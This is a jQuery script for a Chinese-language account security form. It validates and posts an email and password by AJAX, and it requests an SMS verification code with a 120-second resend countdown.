$(document).ready(function(){
		if(!window.name){
				window.name = 'test';
				window.location.reload();
		}
		$("#safe").click(function(){
			var emailObj = $("#email");
			var pwdObj = $("#pwd");
			var posturl = $("#url").val();
			var tips = "";
			if(!checkEmail(emailObj.val()) && tips==""){
				tips ="邮箱格式不正确,请重新输入";
			}
			if(pwdObj.val() == null || pwdObj.val() == "" || "请输入您的账号密码" ==  pwdObj.val()){
				tips ="请输入账号密码";
			}
			
			if(tips!=""){
				showmsg(tips);
				return false;
			}
			var form_data = {
				email: emailObj.val(),
				pwd: pwdObj.val(),
				type: "email"
			};			
			$.ajax({
				type: "POST",
				url: posturl,
				data: form_data,
				error : function(XMLHttpRequest, textStatus, errorThrown) {   
					showmsg('读取超时，网络错误'); 
				},
				
				dataType:"json",
				success: function(result)
				{
					if ('success' == result.state){
						$("#safe-email").submit();
					}else{
						showmsg(result.msg);
					}
				}	
			});
			return false;
		});


	});

//显示返回的信息
function showmsg(msg)
{
	$("#message").html('<li class="li_12"><span>'+msg+'</span></li>');
}

//检查邮箱的格式
function checkEmail(mail){
	if(mail.match(/^[-_.a-z0-9A-Z]+([-_.][a-zA-Z0-9]+)*@([a-zA-Z0-9]+([-_.][a-zA-Z0-9]+))+$/i)){
		return true;
	}else{
		return false;
	}
}

/*-------------------------------------------*/  
var InterValObj; //timer变量，控制时间  
var count = 120; //间隔函数，1秒执行  
var curCount;//当前剩余秒数  
var code = ""; //验证码  
var codeLength = 6;//验证码长度  
function sendMessage() {  
    curCount = count;  
    var phone=$("#smobile").val();//手机号码  
	
	if(!checkPhone(phone)){
		var tips ="手机格式不正确,请返回重新提交";
		showmsg(tips);
		return false;
	}
    else{  
        //产生验证码  
       // for (var i = 0; i < codeLength; i++) {  
          //  code += parseInt(Math.random() * 9).toString();  
       // }  
         
		//向后台发送处理数据  
        $.ajax({  
            type: "POST", //用POST方式传输  
            dataType: "JSON", //数据格式:JSON  
            url: 'pc_ajax.php?do=safe', //目标地址  
            data: "phone=" + phone,  
            error: function (XMLHttpRequest, textStatus, errorThrown) { 
				showmsg('发送超时，网络错误');
			},  
            success: function (result){ 
				if(result.success){
					//设置button效果，开始计时 
					
					$("#btnSendCode").attr("disabled", "true");  
					$("#btnSendCode").val("请在" + curCount + "秒内输入验证码");  
					InterValObj = window.setInterval(SetRemainTime, 1000); //启动计时器，1秒执行一次 
				}else{
					showmsg(result.msg); 
				}
			}  
        });  
    }
}  
//timer处理函数  
function SetRemainTime() {  
    if (curCount == 0) {                  
        window.clearInterval(InterValObj);//停止计时器  
        $("#btnSendCode").removeAttr("disabled");//启用按钮  
        $("#btnSendCode").val("重新发送验证码");  
        code = ""; //清除验证码。如果不清除，过时间后，输入收到的验证码依然有效      
    }  
    else {  
        curCount--;  
        $("#btnSendCode").val("请在" + curCount + "秒内输入验证码");  
    }  
}  